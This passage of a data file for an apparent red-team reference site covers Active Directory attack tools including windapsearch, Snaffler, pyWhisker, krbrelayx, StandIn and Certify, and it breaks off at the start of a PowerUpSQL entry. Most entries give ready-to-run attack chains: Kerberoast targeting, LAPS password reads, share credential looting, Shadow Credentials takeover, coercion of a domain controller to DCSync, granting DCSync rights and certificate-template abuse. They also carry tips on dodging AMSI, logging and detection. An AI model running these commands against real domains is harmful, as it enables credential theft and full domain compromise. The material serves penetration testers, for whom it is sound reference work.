          { label: "Kerberoastable accounts", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m spns" },
          { label: "Unconstrained delegation hosts", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m unconstrained" },
          { label: "Raw custom LDAP filter", cmd: "windapsearch -d target.local -u jdoe -p pass --custom '(objectClass=trustedDomain)'" }
        ],
        sections: [
          {
            title: "Modules",
            type: "table",
            columns: ["Module", "What it returns"],
            rows: [
              ["users", "All user objects"],
              ["computers", "All computer objects, with OS where present"],
              ["groups", "All groups"],
              ["privileged-users", "Members of the built-in privileged groups (Domain/Enterprise Admins and friends)"],
              ["spns", "Accounts with a servicePrincipalName — the Kerberoast target list"],
              ["unconstrained", "Hosts and accounts trusted for unconstrained delegation"],
              ["gpos", "Group Policy Objects"],
              ["custom", "Any raw LDAP filter you supply"]
            ]
          },
          {
            title: "Connection & Auth",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target domain FQDN"],
              ["--dc <host>", "Specific domain controller to query"],
              ["-u <user>", "Bind user, usually user@domain form"],
              ["-p <pass>", "Password"],
              ["--secure", "Use LDAPS (636) instead of LDAP (389)"],
              ["-U / --unauth", "Attempt an anonymous bind"],
              ["--attrs <list>", "Return only the attributes you care about"]
            ]
          },
          {
            title: "Useful Custom Filters",
            type: "table",
            columns: ["Filter", "Finds"],
            rows: [
              ["(userAccountControl:1.2.840.113556.1.4.803:=4194304)", "Accounts with pre-auth disabled (AS-REP roastable)"],
              ["(servicePrincipalName=*)", "Kerberoastable accounts, the manual version of -m spns"],
              ["(userAccountControl:1.2.840.113556.1.4.803:=524288)", "Accounts trusted for delegation"],
              ["(adminCount=1)", "Protected / historically privileged accounts"],
              ["(&(objectCategory=person)(description=*pass*))", "Descriptions mentioning a password"],
              ["(ms-MCS-AdmPwd=*)", "LAPS-managed local admin passwords, where you can read them"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Roast targets in one shot", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m spns --attrs sAMAccountName,servicePrincipalName\n# feed the account names to a Kerberoast request" },
              { label: "Map the privileged surface", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m privileged-users\nwindapsearch -d target.local -u jdoe@target.local -p pass -m unconstrained" },
              { label: "Hunt LAPS you can read", cmd: "windapsearch -d target.local -u jdoe -p pass \\\n  --custom '(ms-MCS-AdmPwd=*)' --attrs dNSHostName,ms-MCS-AdmPwd" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The single static Go binary is the practical draw — no Python, no dependencies, easy to stage on a locked-down jump host.",
              "The bitwise UAC filters (1.2.840.113556.1.4.803) are worth memorising; they express 'flag X is set' and drive most of the interesting queries.",
              "It is surgical where ldapdomaindump is exhaustive. Use windapsearch to answer a specific question mid-engagement and ldapdomaindump for the full offline copy.",
              "Reading ms-MCS-AdmPwd returns a cleartext local admin password wherever your principal has the delegated read right — always worth checking.",
              "See the LDAP theory page for the query language and the Kerberoasting/Delegation pages for what these targets are."
            ]
          }
        ]
      },
      {
        id: "snaffler",
        name: "Snaffler",
        url: "https://github.com/SnaffCon/Snaffler",
        description: "Crawls accessible file shares hunting for credentials and sensitive data.",
        brief: "Snaffler walks the domain's computers, finds the shares you can read, and then hunts inside them for the things that matter — passwords in scripts, config files with connection strings, private keys, KeePass databases, backup files, and hundreds of other patterns — using a tuned rule set that ranks each hit by how likely it is to be a real secret.\n\nThe problem it solves is scale. A domain has thousands of files across hundreds of shares; nobody reads them by hand. Snaffler does, and colour-codes the output so the red hits are the ones worth opening.",
        quickReference: [
          { label: "Standard domain-wide hunt", cmd: "Snaffler.exe -s -o snaffler.log" },
          { label: "Target specific hosts", cmd: "Snaffler.exe -n host1,host2 -s -o snaffler.log" },
          { label: "Share enumeration only (no file content)", cmd: "Snaffler.exe -y -o shares.log" },
          { label: "Tune verbosity to the interesting hits", cmd: "Snaffler.exe -s -v data -o snaffler.log" }
        ],
        sections: [
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-s", "Print results to stdout as it goes"],
              ["-o <file>", "Write the full log to a file"],
              ["-n <hosts>", "Target a specific comma-separated host list instead of discovering via the domain"],
              ["-i <path>", "Snaffle a specific local or UNC path rather than the whole domain"],
              ["-y", "Enumerate shares only — do not crawl file contents"],
              ["-v <level>", "Verbosity: data (hits only) up to trace (everything)"],
              ["-m <path>", "Copy found files to a local loot directory"],
              ["-l <n>", "Max file size to inspect"]
            ]
          },
          {
            title: "Result Severity",
            type: "table",
            columns: ["Colour / level", "Meaning"],
            rows: [
              ["Black", "Highest confidence — a private key, a KeePass DB, a file literally named 'passwords'"],
              ["Red", "Strong indicator — config with a likely credential, a script with a plaintext password"],
              ["Yellow", "Worth a look — interesting extension or keyword, more false positives"],
              ["Green", "Low priority — a share or file that matched a weak rule"],
              ["Triage order", "Read black and red first; they are where the actual wins are"]
            ]
          },
          {
            title: "What It Hunts For",
            type: "table",
            columns: ["Category", "Examples"],
            rows: [
              ["Credentials in code", "web.config, appsettings.json, .env, connection strings, hardcoded passwords in scripts"],
              ["Key material", "id_rsa, .pem, .pfx, .ppk, .key files"],
              ["Password stores", "KeePass (.kdbx), password manager exports, files named creds/passwords"],
              ["Config & infra", "unattend.xml, sysprep, Group Policy Preferences, vCenter/backup configs"],
              ["Scripts", "PowerShell, batch, and VBS with embedded credentials or service accounts"],
              ["Documents", "Spreadsheets and docs whose names suggest secrets"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Run it, then triage by severity", cmd: "Snaffler.exe -s -o snaffler.log\n# pull just the high-confidence hits\nfindstr /C:\"[Black]\" /C:\"[Red]\" snaffler.log" },
              { label: "Scope to hosts you already have footholds on", cmd: "Snaffler.exe -n fileserver01,appserver02 -s -m .\\loot -o snaffler.log\n# -m copies the hits locally for offline review" },
              { label: "Quiet share map first", cmd: "Snaffler.exe -y -o shares.log\n# decide which shares are worth a full content crawl before making the noise" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Triage by colour. Black and red are the real findings; yellow and green are mostly noise you skim only if the top hits come up dry.",
              "It is a .NET binary that generates real SMB traffic to many hosts — noisy and detectable. Scope it and run it in an authorised window.",
              "GPP passwords (cpassword in Groups.xml) are a classic Snaffler find and are decryptable with a public, Microsoft-published key.",
              "Use -m to copy hits into a loot folder so you review credentials offline instead of re-reading shares repeatedly.",
              "There is a Python port (snaffler.py) if you need to run it from a non-Windows foothold."
            ]
          }
        ]
      },
      {
        id: "pywhisker",
        name: "pyWhisker",
        url: "https://github.com/ShutdownRepo/pywhisker",
        description: "Adds Shadow Credentials by writing msDS-KeyCredentialLink to take over an account.",
        brief: "pyWhisker performs the Shadow Credentials attack. If you have write access to the msDS-KeyCredentialLink attribute of a target account — a right you often gain through an ACL or a relayed LDAP session — you can add your own certificate key pair to it. That lets you authenticate as the target via Kerberos PKINIT and recover its NT hash, without ever touching or resetting its password.\n\nIt is the quieter, more reversible cousin of a password reset: the legitimate owner is unaffected, and you clean up by removing the key you added.",
        quickReference: [
          { label: "Add a shadow credential", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action add" },
          { label: "List existing key credentials", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action list" },
          { label: "Remove one you added", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action remove --device-id <guid>" },
          { label: "Clear all (cleanup)", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action clear" }
        ],
        sections: [
          {
            title: "Actions",
            type: "table",
            columns: ["Action", "What it does"],
            rows: [
              ["add", "Add a new key credential and output a certificate/PFX for authentication"],
              ["list", "Show the key credentials currently on the target"],
              ["remove", "Remove a specific key credential by its device ID"],
              ["clear", "Remove all key credentials — the clean-up action after you are done"],
              ["info", "Show detail on a specific key credential"]
            ]
          },
          {
            title: "Prerequisites",
            type: "table",
            columns: ["Requirement", "Notes"],
            rows: [
              ["Write to msDS-KeyCredentialLink", "GenericWrite/GenericAll over the target, or the specific attribute write — often found via BloodHound"],
              ["A 2016+ functional level", "PKINIT via key credentials requires the KeyCredentialLink support introduced then"],
              ["AD CS or a KDC cert", "The domain must support PKINIT — usually true wherever a DC has a certificate"],
              ["Reachable LDAP", "The attribute write happens over LDAP/LDAPS"]
            ]
          },
          {
            title: "The Attack Chain",
            type: "table",
            columns: ["Step", "Tool"],
            rows: [
              ["1. Confirm write access", "BloodHound shows AddKeyCredentialLink / GenericWrite over the target"],
              ["2. Add the key", "pywhisker --action add, which outputs a .pfx and its password"],
              ["3. Authenticate via PKINIT", "certipy auth or gettgtpkinit to get a TGT as the target"],
              ["4. Recover the NT hash", "The PKINIT exchange returns the target's NT hash (UnPAC-the-hash)"],
              ["5. Clean up", "pywhisker --action clear to remove the shadow credential"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full takeover of an account you can write to", cmd: "pywhisker -d target.local -u jdoe -p pass --target svc_sql --action add\n# note the emitted PFX and its password, then:\ncertipy auth -pfx svc_sql.pfx -dc-ip 10.10.10.10\n# you now hold svc_sql's TGT and NT hash" },
              { label: "Chain from a relayed LDAP session", cmd: "# ntlmrelayx with --shadow-credentials does this during a relay\nntlmrelayx.py -t ldap://dc01 --shadow-credentials --shadow-target victim\\$" },
              { label: "Clean up afterwards", cmd: "pywhisker -d target.local -u jdoe -p pass --target svc_sql --action clear" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This does not reset or change the target's password, so the legitimate owner keeps working and the account does not lock — much stealthier than a reset.",
              "It needs a 2016+ domain functional level and a domain that supports PKINIT (an AD CS or KDC certificate). On older domains, fall back to a password reset or RBCD.",
              "Always run the clear action when you are finished. A leftover key credential is both a loose end and an easy detection.",
              "It pairs directly with certipy auth for the PKINIT step and with ntlmrelayx's --shadow-credentials for the relay variant.",
              "See the AD CS and ACLs & DACLs theory pages for why the write access exists and what PKINIT is doing."
            ]
          }
        ]
      },
      {
        id: "krbrelayx",
        name: "krbrelayx",
        url: "https://github.com/dirkjanm/krbrelayx",
        description: "Kerberos relay and unconstrained-delegation abuse toolkit.",
        brief: "krbrelayx handles the Kerberos side of relay and delegation attacks that ntlmrelayx (which is NTLM-only) cannot. Its headline use is unconstrained delegation abuse: if you control a host trusted for unconstrained delegation, you coerce a target — ideally a domain controller — to authenticate to it, and krbrelayx captures the TGT that gets cached, giving you the target's Kerberos identity outright.\n\nIt also performs Kerberos relaying in scenarios where an attacker-controlled name resolution lets a Kerberos ticket be redirected, and it is the standard partner to the printerbug/coercion tools on the delegation path.",
        quickReference: [
          { label: "Capture TGTs via unconstrained delegation", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
          { label: "Export a captured TGT for reuse", cmd: "export KRB5CCNAME=DC01\\$@TARGET.LOCAL.ccache" },
          { label: "Trigger the DC to authenticate", cmd: "printerbug.py target.local/user:pass@dc01 attacker_host" },
          { label: "Then DCSync with the DC's ticket", cmd: "secretsdump.py -k -no-pass dc01.target.local" }
        ],
        sections: [
          {
            title: "Core Use Cases",
            type: "table",
            columns: ["Scenario", "What krbrelayx does"],
            rows: [
              ["Unconstrained delegation abuse", "Runs a listener that captures the TGT a coerced host caches when it authenticates to your delegation-trusted machine"],
              ["Kerberos relaying", "Relays Kerberos authentication where a name-resolution primitive (ADIDNS, mitm6) lets you redirect it"],
              ["SPN-less relay", "Works in cases NTLM relay cannot, because Kerberos service tickets are the currency"],
              ["Delegation to DCSync", "The captured DC TGT is used directly to replicate secrets"]
            ]
          },
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-aesKey <key>", "The AES key of the delegation-trusted host account, to decrypt/accept the incoming ticket"],
              ["-hashes <lm:nt>", "Alternatively supply the host account NT hash"],
              ["--krbsalt / --krbpass", "Provide the salt and password to derive keys when you know the account password"],
              ["-t <target>", "Target for the relay variants"],
              ["-ip <addr>", "Interface/address for the listener"]
            ]
          },
          {
            title: "Unconstrained Delegation Chain",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["1. Find it", "A computer with TRUSTED_FOR_DELEGATION set — BloodHound flags these as unconstrained"],
              ["2. Control it", "You need the host's key material (compromise it, or own a computer object you created)"],
              ["3. Listen", "krbrelayx runs on that host with its AES key, waiting for inbound authentications"],
              ["4. Coerce", "printerbug/PetitPotam/Coercer forces the DC's machine account to authenticate to your host"],
              ["5. Capture", "The DC's TGT is cached on your host and krbrelayx exports it"],
              ["6. Impersonate", "Use the DC TGT to DCSync the domain"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Unconstrained delegation to domain compromise", cmd: "# on the delegation-trusted host you control:\nkrbrelayx.py -aesKey <host_aes_key>\n# from another box, coerce the DC:\nprinterbug.py 'target.local/user:pass@dc01' attacker_host\n# a DC01$ TGT is written; reuse it:\nexport KRB5CCNAME=DC01\\$@TARGET.LOCAL.ccache\nsecretsdump.py -k -no-pass dc01.target.local" },
              { label: "Add your own delegation host via RBCD", cmd: "# if you cannot own an existing unconstrained host,\n# create a computer account and abuse constrained/RBCD paths instead\n# (see bloodyAD / ntlmrelayx --delegate-access)" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This is the Kerberos-native counterpart to ntlmrelayx. Reach for krbrelayx when the identity in play is a Kerberos ticket rather than an NTLM auth.",
              "Unconstrained delegation on any host you can compromise is close to game over: coerce a DC to it and you capture the DC's TGT.",
              "You need the delegation host's key material (AES key or NT hash) for the listener to accept the incoming ticket — compromise the host first, or create your own computer object.",
              "Pairs with printerbug/PetitPotam/Coercer for the coercion step and with secretsdump for the DCSync payoff.",
              "See the Delegation and Coercion & NTLM Relay theory pages for the full mechanism."
            ]
          }
        ]
      },
      {
        id: "pingcastle",
        name: "PingCastle",
        url: "https://www.pingcastle.com/",
        description: "Scores an AD domain's security posture and maps risks — the defender's-eye view.",
        brief: "PingCastle audits an Active Directory domain and produces a risk-scored report: a single maturity number, a breakdown across privileged accounts, trusts, stale objects, and known misconfigurations, and a prioritised list of what to fix. It reads the domain the way a defender would, which on a red team is exactly why it is useful — it surfaces the same weaknesses you would otherwise find by hand, quickly, and in a form the client already trusts.\n\nIt is authenticated but low-impact: a normal domain user can run the healthcheck, and it queries rather than exploits, which makes it safe to run early.",
        quickReference: [
          { label: "Full domain health check", cmd: "PingCastle.exe --healthcheck --server target.local" },
          { label: "Interactive menu", cmd: "PingCastle.exe" },
          { label: "Map trust relationships", cmd: "PingCastle.exe --healthcheck --explore-trust" },
          { label: "Scan for a specific risk", cmd: "PingCastle.exe --scanner <scanner_name> --server target.local" }
        ],
        sections: [
          {
            title: "Report Categories",
            type: "table",
            columns: ["Category", "What it scores"],
            rows: [
              ["Stale Objects", "Inactive accounts, old OS versions, unused but still-trusted objects"],
              ["Privileged Accounts", "Admin group hygiene, delegation, and privileged-account exposure"],
              ["Trusts", "Trust relationships and the risk each inbound/outbound trust introduces"],
              ["Anomalies", "Known misconfigurations and attack primitives (roasting exposure, weak ACLs, etc.)"],
              ["Maturity score", "A single 0–100 style figure summarising overall posture for management"]
            ]
          },
          {
            title: "Built-in Scanners",
            type: "table",
            columns: ["Scanner", "Checks for"],
            rows: [
              ["aclcheck", "Dangerous ACLs on key objects"],
              ["antivirus", "Endpoint protection presence across hosts"],
              ["laps_bitlocker", "Whether LAPS and BitLocker are deployed"],
              ["localadmin", "Local administrator group membership"],
              ["nullsession", "Hosts still allowing anonymous enumeration"],
              ["smb / smb3querynetwork", "SMB signing and version posture"],
              ["spooler", "Print Spooler running (PrinterBug exposure)"]
            ]
          },
          {
            title: "Reading It as an Attacker",
            type: "table",
            columns: ["Finding", "Offensive relevance"],
            rows: [
              ["Kerberoastable admins", "High-value roast targets, pre-identified"],
              ["Unconstrained delegation", "Coercion-to-DC-compromise candidates"],
              ["Spooler enabled on DCs", "PrinterBug coercion is available"],
              ["Weak/old trusts", "Cross-domain and cross-forest movement paths"],
              ["Accounts with old passwords", "Likely weak or reused credentials worth spraying"],
              ["Missing SMB signing", "Relay targets, matching netexec's relay list"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Baseline the domain early", cmd: "PingCastle.exe --healthcheck --server target.local\n# open the HTML report; the Anomalies section is your prioritised attack list" },
              { label: "Cross-reference with BloodHound", cmd: "# PingCastle names the misconfigurations; BloodHound shows the paths\n# a Kerberoastable admin in PingCastle -> trace its reach in BloodHound" },
              { label: "Produce the client-facing risk view", cmd: "# the maturity score and remediation list drop straight into a report\n# framing findings the way the client's own auditors would" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "It is authenticated but query-only and low-impact — safe to run early with any domain user, unlike the exploitation tooling around it.",
              "The Anomalies section is effectively a pre-built attack plan: it lists the same misconfigurations you would hunt for manually, ranked.",
              "Because clients recognise and trust PingCastle output, its report is a persuasive way to communicate findings and remediation in a deliverable.",
              "It complements BloodHound rather than replacing it: PingCastle scores what is wrong, BloodHound shows how the wrong things connect into a path.",
              "See the AD Fundamentals, Trusts, and Delegation theory pages for the concepts behind the scores."
            ]
          }
        ]
      },
      {
        "id": "standin",
        "name": "StandIn",
        "url": "https://github.com/FuzzySecurity/StandIn",
        "description": "Small C# AD post-exploitation toolkit for LDAP enumeration and object manipulation, run in memory via execute-assembly.",
        "brief": "StandIn is a compact C# toolkit for Active Directory enumeration and manipulation, designed to be run in memory (Sliver/Cobalt Strike execute-assembly) instead of PowerShell, so it sidesteps script-block logging and AMSI. It takes raw LDAP filters and can also read and write specific object attributes — enumerate users, computers, groups, OUs, GPOs and delegation, and set attributes such as msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD or add DCSync rights.\n\nIt is the go-to replacement for PowerView/SharpView on engagements where those are detected, because it is small, single-purpose, and driven by LDAP queries the operator writes.",
        "quickReference": [
          {
            "label": "Raw LDAP query",
            "cmd": "StandIn.exe --ldap \"(&(objectCategory=person)(objectClass=user))\""
          },
          {
            "label": "One object, selected attrs",
            "cmd": "StandIn.exe --object samaccountname=administrator --filter description,lastlogon"
          },
          {
            "label": "Find delegation / SPNs",
            "cmd": "StandIn.exe --delegation    |    StandIn.exe --spn"
          },
          {
            "label": "Grant DCSync rights",
            "cmd": "StandIn.exe --object \"distinguishedname=DC=corp,DC=local\" --grant \"CORP\\me\" --type DCSync"
          }
        ],
        "sections": [
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Purpose"
            ],
            "rows": [
              [
                "--object <attr=val> / --filter <attrs>",
                "Resolve an object and return selected attributes"
              ],
              [
                "--ldap \"<filter>\" / --limit <n>",
                "Raw LDAP query; cap the result count (default 50)"
              ],
              [
                "--delegation",
                "List unconstrained / constrained / RBCD objects"
              ],
              [
                "--asrep / --spn",
                "AS-REP-roastable accounts / accounts with SPNs (Kerberoast)"
              ],
              [
                "--gpo [--acl]",
                "Enumerate GPOs and, with --acl, their DACLs"
              ],
              [
                "--group <name> --ntaccount <DOM\\user> --add|--remove",
                "Read or modify group membership"
              ],
              [
                "--computer <name> --make",
                "Create a machine account (ms-DS-MachineAccountQuota applies)"
              ],
              [
                "--computer <target> --sid <SID> [--remove]",
                "Set/clear msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)"
              ],
              [
                "--object \"<dn>\" --grant \"<DOM\\user>\" --type <right>",
                "Grant rights (GenericAll/GenericWrite/ResetPassword/WriteMembers/DCSync) or --guid"
              ],
              [
                "--adcs [--clientauth]",
                "Enumerate AD CS templates (client-authentication EKUs)"
              ],
              [
                "--domain / --user / --pass / --dc",
                "Explicit credentials and target DC"
              ]
            ]
          },
          {
            "title": "Common Usage (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Enumerate objects with a raw LDAP filter",
                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--ldap \"(&(objectCategory=person)(objectClass=user))\"'\n# --filter <attrs> returns only specific properties; --limit caps results (default 50)"
              },
              {
                "label": "Inspect a single object",
                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--object samaccountname=krbtgt --filter serviceprincipalname,description'"
              },
              {
                "label": "Delegation / SPNs / GPOs (with ACLs)",
                "cmd": "'/path/StandIn.exe' --delegation          # unconstrained / constrained / RBCD\n'/path/StandIn.exe' --spn                 # Kerberoastable SPNs\n'/path/StandIn.exe' --gpo --acl           # GPOs and their ACLs"
              },
              {
                "label": "Add a computer account, then set RBCD",
                "cmd": "'/path/StandIn.exe' --computer EvilPC --make                 # needs MachineAccountQuota > 0\n'/path/StandIn.exe' --computer <target> --sid <EvilPC-SID>   # write msDS-AllowedToActOnBehalfOfOtherIdentity"
              },
              {
                "label": "Grant DCSync (or other rights) over the domain",
                "cmd": "'/path/StandIn.exe' '--object \"distinguishedname=DC=corp,DC=local\" --grant \"CORP\\me\" --type DCSync'\n# --type: GenericAll | GenericWrite | ResetPassword | WriteMembers | DCSync  (or --guid <rightsGuid>)"
              }
            ]
          },
          {
            "title": "Notes",
            "type": "notes",
            "items": [
              "Run inline (execute-assembly -i -M -E) to apply Sliver's AMSI/ETW bypass in the current process for the quietest execution.",
              "Because it speaks raw LDAP, consecutive queries still trip Microsoft Defender for Identity — pace enumeration on real engagements.",
              "Pairs with ADSearch (read-only enumeration) and Rubeus/PEzor (ticket and credential steps) in the standard in-memory AD workflow."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "StandIn — GitHub (FuzzySecurity)",
                "url": "https://github.com/FuzzySecurity/StandIn"
              },
              {
                "label": "Toolkit — Sliver (execute-assembly workflow)",
                "url": "toolkit.html"
              }
            ]
          }
        ]
      },
      {
        "id": "adsearch",
        "name": "ADSearch",
        "url": "https://github.com/tomcarver16/ADSearch",
        "description": "C# tool for quick, targeted LDAP searches in Active Directory, built for in-memory use by C2 frameworks.",
        "brief": "ADSearch is a lightweight C# utility for running LDAP queries against Active Directory and returning selected attributes, built to be executed in memory by a C2 (execute-assembly). It offers shortcut switches for common objects (--users, --computers, --groups) and a --search flag for arbitrary LDAP filters, with --attributes to limit the returned properties.\n\nIt is a read-only enumeration companion to StandIn: where StandIn can also modify objects, ADSearch focuses on fast, clean querying and is convenient for mapping users, computers, groups, domains and trusts.",
        "quickReference": [
          {
            "label": "All users / computers / groups",
            "cmd": "ADSearch.exe --users   |   --computers   |   --groups"
          },
          {
            "label": "Custom LDAP filter",
            "cmd": "ADSearch.exe --search \"(samaccountname=administrator)\" --attributes cn,description"
          },
          {
            "label": "Enumerate trusts",
            "cmd": "ADSearch.exe --search \"(objectClass=trustedDomain)\" --attributes cn,trustDirection"
          }
        ],
        "sections": [
          {
            "title": "Common Usage (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Shortcut enumeration",
                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/ADSearch.exe' '--users'\nexecute-assembly -p explorer.exe -t 80 '/path/ADSearch.exe' '--computers'"
              },
              {
                "label": "Arbitrary filter with selected attributes",
                "cmd": "'/path/ADSearch.exe' '--search \"(&(objectCategory=person)(objectClass=user))\" --attributes cn,logoncount,description'"
              },
              {
                "label": "Domains and trusts",
                "cmd": "'/path/ADSearch.exe' '--search \"(objectClass=trustedDomain)\" --attributes cn,trustDirection,trustAttributes'"
              }
            ]
          },
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Purpose"
            ],
            "rows": [
              [
                "--users / --computers / --groups",
                "Shortcut enumeration of common object classes"
              ],
              [
                "--domain-admins",
                "Members of the Domain Admins group"
              ],
              [
                "--spns",
                "Accounts with a servicePrincipalName (Kerberoast targets)"
              ],
              [
                "--search \"<LDAP filter>\"",
                "Arbitrary LDAP query"
              ],
              [
                "--attributes <a,b,c>",
                "Return only these attributes (default: a sensible set)"
              ],
              [
                "--full",
                "Return every attribute of each result"
              ],
              [
                "--json / --output <file>",
                "Machine-readable output / write results to a file"
              ],
              [
                "--domain <fqdn> / --hostname <dc> / --port <n>",
                "Target domain, specific DC, and LDAP port"
              ],
              [
                "--username <u> / --password <p> / --insecure",
                "Explicit credentials (else the current token); LDAP without TLS"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Read-only companion to StandIn: use ADSearch to map users/computers/groups/trusts quickly, and StandIn when you also need to write objects.",
              "Built for execute-assembly, so it avoids PowerShell logging — but bulk LDAP from a workstation still trips Microsoft Defender for Identity; keep queries targeted.",
              "The DC flag is --hostname (not --domaincontroller); --json / --output feed results straight into BloodHound or your notes."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "ADSearch — GitHub (tomcarver16)",
                "url": "https://github.com/tomcarver16/ADSearch"
              }
            ]
          }
        ]
      },
      {
        "id": "certify",
        "name": "Certify",
        "url": "https://github.com/GhostPack/Certify",
        "description": "C# tool to enumerate and abuse Active Directory Certificate Services (AD CS) misconfigurations (ESC1–ESC8).",
        "brief": "Certify is GhostPack's C# tool for finding and abusing AD CS misconfigurations. It enumerates certificate authorities and templates, flags vulnerable templates (enrollee-supplies-subject, dangerous EKUs, enrollment-agent templates), and requests certificates — including with an arbitrary Subject Alternative Name (ESC1) or on behalf of another user via an enrollment-agent certificate (ESC3). The resulting PFX is used with Rubeus to obtain a TGT for the impersonated (often Domain Admin) account.\n\nIt is the C# counterpart to Certipy (Python) and the natural choice when working in memory from a Windows foothold via execute-assembly.",
        "quickReference": [
          {
            "label": "Enumerate CAs / templates",
            "cmd": "Certify.exe cas   |   Certify.exe find"
          },
          {
            "label": "Find vulnerable templates",
            "cmd": "Certify.exe find /vulnerable    (or /enrolleeSuppliesSubject)"
          },
          {
            "label": "ESC1 request (arbitrary SAN)",
            "cmd": "Certify.exe request /ca:<ca> /template:<tmpl> /altname:administrator"
          },
          {
            "label": "Convert + get TGT",
            "cmd": "openssl pkcs12 ... -> Rubeus asktgt /certificate:<pfx> /ptt"
          }
        ],
        "sections": [
          {
            "title": "Enumeration & Certificate Requests (via Sliver execute-assembly)",
            "type": "commands",
            "commands": [
              {
                "label": "Enumerate CAs and templates",
                "cmd": "execute-assembly -p explorer.exe -t 40 '/path/Certify.exe' cas\nexecute-assembly -p explorer.exe -t 40 '/path/Certify.exe' find\n'/path/Certify.exe' 'find /vulnerable'   |   'find /enrolleeSuppliesSubject'"
              },
              {
                "label": "Request a certificate with an arbitrary SAN (enrollee-supplies-subject template)",
                "cmd": "'/path/Certify.exe' 'request /ca:<ca> /template:<template> /altname:<target-user>'"
              },
              {
                "label": "Request an enrollment-agent cert, then enroll on behalf of another user",
                "cmd": "'/path/Certify.exe' 'request /ca:<ca> /template:<enrollment-agent-template>'\n'/path/Certify.exe' 'request /ca:<ca> /template:<target-template> /onbehalfof:<domain>\\<target-user> /enrollcert:<agent>.pfx /enrollcertpw:<pfx-password>'"
              },
              {
                "label": "Convert the issued PEM to a PFX for use",
                "cmd": "openssl pkcs12 -in <cert>.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out <cert>.pfx\n# the PFX is then used for authentication (e.g. Rubeus asktgt) — see Vulns -> AD CS ESC for the full chain"
              }
            ]
          },
          {
            "title": "Commands & flags",
            "type": "table",
            "columns": [
              "Command",
              "Purpose"
            ],
            "rows": [
              [
                "Certify.exe cas",
                "List CAs, their templates and relevant flags"
              ],
              [
                "Certify.exe find",
                "Enumerate all certificate templates"
              ],
              [
                "find /vulnerable",
                "Only templates with an ESC misconfiguration"
              ],
              [
                "find /enrolleeSuppliesSubject",
                "ESC1 candidates (requester supplies the SAN)"
              ],
              [
                "find /ca:<CA>",
                "Scope enumeration to a single CA"
              ],
              [
                "request /ca:<CA> /template:<T> /altname:<user>",
                "ESC1 — request a cert with an arbitrary SAN"
              ],
              [
                "request /ca:<CA> /template:<agentT>  then  /onbehalfof:<DOM\\user> /enrollcert:<agent>.pfx /enrollcertpw:<pw>",
                "ESC3 — enrollment-agent, then enrol on behalf of a target"
              ],
              [
                "download /id:<reqId>",
                "Retrieve an issued/pending request (e.g. after ESC7 approval)"
              ],
              [
                "pkiobjects",
                "Dump PKI objects and their ACLs (ESC4 / ESC5)"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "ESC mapping: ESC1 = /altname on an enrollee-supplies-subject template; ESC3 = enrollment agent; ESC6/7/8 live on the CA / web-enrollment side. Full chain: the AD CS theory page and the AD map ADCS stage.",
              "Certify 2.0 reworked the CLI (e.g. find --json); verify the exact syntax against your build.",
              "The issued PEM is converted to a PFX, then used with Rubeus (asktgt /ptt) to turn the cert into a TGT. Certipy is the Python/Linux equivalent that does request+auth in one step."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Certify — GitHub (GhostPack)",
                "url": "https://github.com/GhostPack/Certify"
              },
              {
                "label": "Vulns — AD CS ESC misconfigurations",
                "url": "vulns.html"
              },
              {
                "label": "Theory — Active Directory Certificate Services",
                "url": "theory/2026-08-18-adcs.html"
              }
            ]
          }
        ]
      },
      {
        "id": "powerupsql",
        "name": "PowerUpSQL / SharpSQL",
        "url": "https://github.com/NetSPI/PowerUpSQL",
        "description": "Toolkits for discovering, auditing and attacking MS SQL Servers in an AD environment, including database-link crawling to xp_cmdshell.",
